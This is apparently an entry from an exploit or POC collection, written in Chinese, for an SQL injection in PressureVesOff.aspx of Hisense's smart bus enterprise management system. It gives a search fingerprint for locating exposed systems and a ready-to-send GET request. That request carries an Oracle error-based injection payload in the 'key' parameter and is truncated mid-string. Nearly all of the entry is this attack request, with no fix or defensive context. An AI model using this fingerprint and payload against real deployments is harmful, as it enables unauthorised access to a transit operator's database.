# 海信智能公交企业管理系统PressureVesOff.aspx存在SQL注入漏洞

- **系统**：海信智能公交企业管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="var _FactoryData"`
- **请求**：`GET /YZSoft/Forms/XForm/BM/PressureVesManagement/PressureVesOff.aspx?key=1%27+AND+8768%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%288768%3D8768%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%`
- **预期**：200　|　—